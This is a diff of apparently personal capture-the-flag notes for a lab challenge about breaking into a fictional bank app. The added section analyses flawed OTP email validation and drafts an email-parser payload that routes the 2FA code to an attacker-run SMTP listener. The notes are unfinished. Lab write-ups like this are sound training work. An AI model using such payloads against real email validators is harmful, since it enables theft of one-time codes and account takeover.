@@ -4,7 +4,7 @@
 
 |================================================================
 - Name: 
-- IP Address: 10.64.142.189
+- IP Address: 10.66.129.33
 - OS: 
 - Notes: 
 
@@ -43,7 +43,7 @@ throne123*
 
 //The device looks innocent enough: a Hopflix streaming app, a banking app, messages, photos, and settings. But nothing about this op is innocent. Hopper must somehow pivot into the linked bank account, and, outsmarting the layered authentication around it, he can wrest control of the funds before King Malhare’s cronies move them for good. If he succeeds, The Best Festival Company is saved; if he fails, the story of “Colonel Panic” ends in quiet disgrace, erased like so many secrets before.
 
-ip=10.64.142.189
+ip=10.66.129.33
 
 //This Side Quest is unlocked by finding the Side Quest key in Advent of Cyber Day 21. Once you’ve recovered that key, visit http://$ip:21337 and enter it to unlock Hopper’s challenge. From there, your mission is simple to state and hard to execute: break into Sir BreachBlocker’s phone, bypass all authentication, and recover the final key needed to release the funds for The Best Festival Company.
 
@@ -315,8 +315,131 @@ print(password)
 // Third Flag
 //What's the BANK_FLAG?
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+# RoadMap: (OTP email → 2FA → release)
 
-Find This!
+#What we know:
+- Bank account ID: 'sbreachblocker@easterbunnies.thm'
+- Bank PIN: 'malharerocks' 
+
+- If PIN is correct, server returns trusted_emails or trusted_domains for OTP routing
+- OTP is emailed (SMTP) and then verified by /api/verify-2fa
+- After 2FA verified, /api/release-funds returns {flag: BANK_FLAG}
+
+
+//Adding hosts entry to be safe.
+-- Add /etc/hosts file entries --
+echo -e "$ip \t easterbunnies.thm" | sudo tee -a /etc/hosts
+cat /etc/hosts
+
+
+//Looking back at the code used to generate such code shows that it is truly random.
+
+// excerpt from main.py
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+...
+@app.route('/api/send-2fa', methods=['POST'])
+def send_2fa():
+    data = request.json
+    otp_email = str(data.get('otp_email', ''))
+
+    if not session.get('bank_authenticated', False):
+        return jsonify({'error': 'Access denied.'}), 403
+
+    # Generate 2FA code
+    two_fa_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
+    session['bank_2fa_code'] = encrypt(two_fa_code)
+
+    if send_otp_email(two_fa_code, otp_email) != -1:
+        return jsonify({'success': True})
+    else:
+        return jsonify({'success': False})
+
+@app.route('/api/verify-2fa', methods=['POST'])
+def verify_2fa():
+    data = request.json
+    code = str(data.get('code', ''))
+
+    if not session.get('bank_authenticated', False):
+        return jsonify({'error': 'Access denied.'}), 403
+
+    if not session.get('bank_2fa_code', False):
+        return jsonify({'error': 'No 2FA code generated'}), 404
+
+    if code == decrypt(session.get('bank_2fa_code')):
+        session['bank_2fa_verified'] = True
+        return jsonify({'success': True})
+    else:
+        if 'bank_2fa_code' in session:
+            del session['bank_2fa_code']
+        return jsonify({'error': 'Invalid code'}), 401
+...
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+//However the logic behind how the application handles emails is deeply flawed. It does a few checks to make sure the email address is valid, the correct structure, and is in the allowed emails/domains lists.
+
+// excerpt from main.py
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+...
+def send_otp_email(otp, to_addr):
+    if not validate_email(to_addr):
+        return -1
+                
+    allowed_emails= session['bank_allowed_emails']
+    allowed_domains= session['bank_allowed_domains']
+    domain = to_addr.split('@')[-1]
+    if domain not in allowed_domains and to_addr not in allowed_emails:
+        return -1
+                
+    from_addr = 'no-reply@hopsecbank.thm'
+    message = f"""\
+    Subject: Your OTP for HopsecBank
+
+    Dear you,
+    The OTP to access your banking app is {otp}.
+    
+    Thanks for trusting Hopsec Bank!"""
+
+    s = smtplib.SMTP('smtp')
+    s.sendmail(from_addr, to_addr, message)
+    s.quit()
+...
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//The real problem here is this line:
+
+if domain not in allowed_domains and to_addr not in allowed_emails:
+        return -1
+
+//This doesn’t ensure that both the domain and email address are valid. Due to how it extracts the domain from the email address, I am able to alter the email so that it matches to an allowed domain but is directed towards my IP.
+
+//By ensuring the email ends with @easterbunnies.thm, the check domain not in allowed_domains always evaluates to False which allows the function to continue, regardless of the actual destination address.
+
+//There is a known vulnerability within SMTP and it allows for us to comment out a part of our email address. Check the link to go deeper on exploiting email parsers to bypass these types of checks.
+https://portswigger.net/research/splitting-the-email-atom
+
+//We’ll need to host an SMTP server in order to receive the one time pass. Since Kali Linux doesn’t come default with one, lets use a tool called aiosmtpd.
+
+//Install
+sudo apt install python3-aiosmtpd
+
+//Start Listener
+aiosmtpd -n -l 192.168.135.149:25
+
+//This can capture a POST request to the /api/send2fa endpoint if we change the email field to the payload.
+
+
+//The payload should look something like:
+attacker@[ATTACKING_IP](@easterbunnies.thm
+
+//I am trying:
+gh05t@[192.168.135.149](@easterbunnies.thm
+
+FIGURE THIS OUT....I AM Tired
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
